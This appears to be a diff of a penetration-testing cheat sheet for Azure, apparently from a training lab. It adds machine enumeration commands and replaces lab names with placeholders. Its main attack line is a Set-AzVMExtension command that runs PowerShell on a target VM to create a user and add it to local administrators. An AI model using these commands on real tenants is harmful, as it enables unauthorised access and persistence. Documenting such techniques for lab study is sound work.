@@ -86,6 +86,16 @@ Add-AzureADGroupMember -ObjectId <GROUP ID> -RefObjectId <USER ID> -Verbose
 
 ## Exploitation Enumeration
 ### When on a new machine
+### Get machine info
+```
+systeminfo
+```
+
+#### Check if Azure or Domain joined
+```
+dsregcmd /status
+```
+
 #### Get context of current user
 ```
 az ad signed-in-user show
@@ -124,14 +134,14 @@ $Results = Invoke-RestMethod -Method Put -Uri $Url -Body $body -Headers $headers
 
 #### Check VM Extensions
 ```
-Get-AzVMExtension -ResourceGroupName Research -VMName infradminsrv
+Get-AzVMExtension -ResourceGroupName <RESEARCH GROUP NAME> -VMName <VM NAME>
 ```
 
 #### Set VM Extensions
 ```
 #Following permissions are required to create a custom script extension and read the output: "Microsoft.Compute/virtualMachines/extensions/write" and "Microsoft.Compute/virtualMachines/extensions/read"
 
-Set-AzVMExtension -ResourceGroupName Research -VMName infradminsrv -ExtensionName ExecCmd -Location germanywestcentral -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users student87 Stud87Password@123 /add /Y; net localgroup administrators student87 /add /Y"}'
+Set-AzVMExtension -ResourceGroupName <RESEARCH GROUP NAME> -VMName <VM NAME> -ExtensionName ExecCmd -Location germanywestcentral -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users <NEW USER> <PASSWORD> /add /Y; net localgroup administrators <NEW USER> /add /Y"}'
 ```
 
 #### Get access token
